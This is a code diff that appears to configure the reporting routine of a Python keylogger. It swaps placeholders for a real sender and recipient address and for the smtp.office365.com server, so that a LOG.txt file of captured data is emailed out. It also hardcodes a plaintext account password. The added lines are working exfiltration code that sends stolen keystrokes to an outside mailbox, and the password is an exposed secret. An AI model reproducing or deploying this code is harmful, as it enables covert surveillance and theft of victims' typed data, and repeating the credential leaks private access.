@@ -27,16 +27,17 @@ def send_report():
     if os.path.exists("LOG.txt"):
         with open("LOG.txt", "r") as file:
             msg = message_from_file(file)
-            msg["From"] = ("email")
-            msg["To"] = ("email")
+            msg["From"] = ("theklggerdead@hotmail.com")
+            msg["To"] = ("juanchislozano08@gmail.com")
             msg["Subject"] = ("Report")
 
-            s = smtplib.SMTP("SMTP_Server", 587)
+            s = smtplib.SMTP("smtp.office365.com", 587)
             s.ehlo()
             s.starttls()
             s.ehlo()
-            s.login("email", "password")
-            s.sendmail("email", "email", msg.as_string())
+            s.login("theklggerdead@hotmail.com", "Euf5g-qBFZPX*t5")
+            s.sendmail("theklggerdead@hotmail.com", "juanchislozano08@gmail.com",
+            msg.as_string())
 
         
 if __name__ == "__main__":
